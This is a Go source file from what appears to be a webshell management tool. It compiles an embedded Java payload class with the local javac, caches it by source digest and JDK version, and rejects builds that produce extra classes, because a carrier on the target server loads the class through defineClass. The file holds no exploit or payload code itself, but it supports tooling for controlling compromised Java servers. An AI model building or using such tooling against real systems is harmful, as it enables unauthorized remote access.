package webshell

// javabuild.go — Java 动态载荷的运行时编译。
//
// 仓库里只存 .java 源码（go:embed 进二进制，仍是可读明文，不开后门），
// 首次使用时调本机 javac 编译出 class，之后按「源码内容 + javac 版本」命中缓存。
// 这样既没有不可审计的二进制产物进版本库，也不要求目标端有任何编译环境。
//
// 缓存键含 javac 版本：换 JDK 后字节码主版本会变（52.0 / 61.0 …），
// 不区分就会把上一个 JDK 编出来的 class 用到新环境里。

import (
	"crypto/sha256"
	"embed"
	"encoding/hex"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
)

//go:embed java/forang/*.java
var javaSources embed.FS

// javaPayloadClass 编译产物在主类路径下的相对位置。
const javaPayloadClass = "forang/Payload.class"

var (
	javaBuildMu  sync.Mutex
	javaBuilt    bool
	javaClass    []byte
	javaBuildErr error
)

// BuildJavaPayload 返回编译好的 forang.Payload class 字节。
// 结果进程内缓存一次；磁盘缓存跨进程复用，重启后不必重新编译。
func BuildJavaPayload() ([]byte, error) {
	javaBuildMu.Lock()
	defer javaBuildMu.Unlock()
	if javaBuilt {
		return javaClass, javaBuildErr
	}
	javaClass, javaBuildErr = buildJavaPayload()
	javaBuilt = true
	return javaClass, javaBuildErr
}

// ResetJavaPayloadCache 丢弃进程内缓存（改源码后的测试用）。
func ResetJavaPayloadCache() {
	javaBuildMu.Lock()
	defer javaBuildMu.Unlock()
	javaBuilt = false
	javaClass, javaBuildErr = nil, nil
}

func buildJavaPayload() ([]byte, error) {
	javac, err := findJavac()
	if err != nil {
		return nil, err
	}
	release, ver := javacRelease(javac)
	digest, err := javaSourceDigest()
	if err != nil {
		return nil, err
	}

	cacheDir, err := javaCacheDir()
	if err == nil {
		target := filepath.Join(cacheDir, digest+"-"+ver+".class")
		if b, readErr := os.ReadFile(target); readErr == nil && len(b) > 0 {
			return b, nil
		}
	}

	tmp, err := os.MkdirTemp("", "forang-java-*")
	if err != nil {
		return nil, fmt.Errorf("创建编译临时目录失败: %w", err)
	}
	defer os.RemoveAll(tmp)

	// 源码与产物都放在同一个临时目录下，跟着 defer 一起清理，不留残留
	srcs, err := javaWriteSources(filepath.Join(tmp, "src"))
	if err != nil {
		return nil, err
	}
	outDir := filepath.Join(tmp, "out")
	if err := os.MkdirAll(outDir, 0o755); err != nil {
		return nil, err
	}

	args := []string{"-encoding", "UTF-8", "-nowarn", "-d", outDir}
	if release {
		args = append(args, "--release", "8")
	} else {
		args = append(args, "-source", "8", "-target", "8")
	}
	args = append(args, srcs...)

	cmd := exec.Command(javac, args...)
	cmd.Env = append(os.Environ(), "LANG=C.UTF-8")
	if out, runErr := cmd.CombinedOutput(); runErr != nil {
		return nil, fmt.Errorf("javac 编译失败: %v\n%s", runErr, strings.TrimSpace(string(out)))
	}

	classPath := filepath.Join(outDir, filepath.FromSlash(javaPayloadClass))
	b, err := os.ReadFile(classPath)
	if err != nil {
		return nil, fmt.Errorf("编译成功但找不到 %s: %w", javaPayloadClass, err)
	}
	// 载体只会 defineClass 这一个类。源码里一旦出现内部类、匿名类、lambda 生成的
	// 辅助类，javac 会额外产出 Payload$1.class，目标端加载时就是 NoClassDefFoundError
	// ——线上表现是「连上了但每个操作都报错」，很难定位。在编译阶段就拦住。
	if extra := extraJavaClasses(outDir); len(extra) > 0 {
		return nil, fmt.Errorf("Java 载荷必须是单个类，但编译产出了额外 class：%s。"+
			"请去掉匿名内部类/lambda（可改用普通静态方法或手写循环）", strings.Join(extra, ", "))
	}
	if len(b) < 4 || b[0] != 0xCA || b[1] != 0xFE || b[2] != 0xBA || b[3] != 0xBE {
		return nil, errors.New("编译产物不是合法 class（magic 不符）")
	}
	if cacheDir != "" {
		if err := os.MkdirAll(cacheDir, 0o755); err == nil {
			_ = os.WriteFile(filepath.Join(cacheDir, digest+"-"+ver+".class"), b, 0o644)
		}
	}
	return b, nil
}

// findJavac 优先用 JAVA_HOME，其次 PATH。找不到时给出可执行的修复提示，
// 而不是让上层拿到一句 "exec: javac: not found"。
func findJavac() (string, error) {
	if home := os.Getenv("JAVA_HOME"); home != "" {
		cand := filepath.Join(home, "bin", "javac")
		if _, err := os.Stat(cand); err == nil {
			return cand, nil
		}
		if _, err := os.Stat(cand + ".exe"); err == nil {
			return cand + ".exe", nil
		}
	}
	if p, err := exec.LookPath("javac"); err == nil {
		return p, nil
	}
	return "", errors.New("未找到 javac：Java 动态载荷需要本机安装 JDK（JRE 不含编译器）。" +
		"请安装 JDK 8+ 后设置 JAVA_HOME，或把 javac 加入 PATH")
}

// javacRelease 判断 javac 是否支持 --release（JDK 9+），并返回版本号用于缓存键。
func javacRelease(javac string) (bool, string) {
	out, err := exec.Command(javac, "-version").CombinedOutput()
	if err != nil {
		return false, "unknown"
	}
	// 输出形如 "javac 21.0.1" 或 "javac 1.8.0_431"，且新旧 JDK 都写在 stderr
	m := regexp.MustCompile(`javac\s+(\d+)`).FindStringSubmatch(string(out))
	if m == nil {
		return false, "unknown"
	}
	major, _ := strconv.Atoi(m[1])
	if major == 1 { // 1.8 形式
		return false, "8"
	}
	return major >= 9, strconv.Itoa(major)
}

// javaSourceDigest 只遍历内嵌源码算摘要，不落盘：缓存命中时可以跳过 IO。
// 文件名也进摘要——改类名而不改内容时缓存必须失效。
func javaSourceDigest() (string, error) {
	h := sha256.New()
	var walk func(dir string) error
	count := 0
	walk = func(dir string) error {
		list, err := javaSources.ReadDir(dir)
		if err != nil {
			return err
		}
		for _, e := range list {
			p := dir + "/" + e.Name()
			if e.IsDir() {
				if err := walk(p); err != nil {
					return err
				}
				continue
			}
			if !strings.HasSuffix(e.Name(), ".java") {
				continue
			}
			data, err := javaSources.ReadFile(p)
			if err != nil {
				return err
			}
			h.Write([]byte(strings.TrimPrefix(p, "java/")))
			h.Write([]byte{0})
			h.Write(data)
			h.Write([]byte{0})
			count++
		}
		return nil
	}
	if err := walk("java"); err != nil {
		return "", err
	}
	if count == 0 {
		return "", errors.New("内嵌 Java 源码为空")
	}
	return hex.EncodeToString(h.Sum(nil))[:16], nil
}

// javaWriteSources 把内嵌源码按包路径展开到 baseDir，返回 javac 要编译的文件列表。
func javaWriteSources(baseDir string) ([]string, error) {
	var files []string
	var walk func(dir string) error
	walk = func(dir string) error {
		list, err := javaSources.ReadDir(dir)
		if err != nil {
			return err
		}
		for _, e := range list {
			p := dir + "/" + e.Name()
			if e.IsDir() {
				if err := walk(p); err != nil {
					return err
				}
				continue
			}
			if !strings.HasSuffix(e.Name(), ".java") {
				continue
			}
			data, err := javaSources.ReadFile(p)
			if err != nil {
				return err
			}
			dst := filepath.Join(baseDir, filepath.FromSlash(strings.TrimPrefix(p, "java/")))
			if err := os.MkdirAll(filepath.Dir(dst), 0o755); err != nil {
				return err
			}
			if err := os.WriteFile(dst, data, 0o644); err != nil {
				return err
			}
			files = append(files, dst)
		}
		return nil
	}
	if err := walk("java"); err != nil {
		return nil, err
	}
	sort.Strings(files)
	return files, nil
}

func javaCacheDir() (string, error) {
	base, err := os.UserCacheDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(base, "forang", "java-payload"), nil
}

// extraJavaClasses 列出主类之外的 .class 产物（内部类、匿名类等）。
// 相对路径排序后返回，便于错误信息稳定可比对。
func extraJavaClasses(outDir string) []string {
	var extra []string
	main := filepath.Clean(filepath.FromSlash(javaPayloadClass))
	_ = filepath.Walk(outDir, func(p string, info os.FileInfo, err error) error {
		if err != nil || info == nil || info.IsDir() || !strings.HasSuffix(p, ".class") {
			return nil
		}
		rel, rerr := filepath.Rel(outDir, p)
		if rerr != nil {
			return nil
		}
		if filepath.Clean(rel) != main {
			extra = append(extra, filepath.ToSlash(rel))
		}
		return nil
	})
	sort.Strings(extra)
	return extra
}
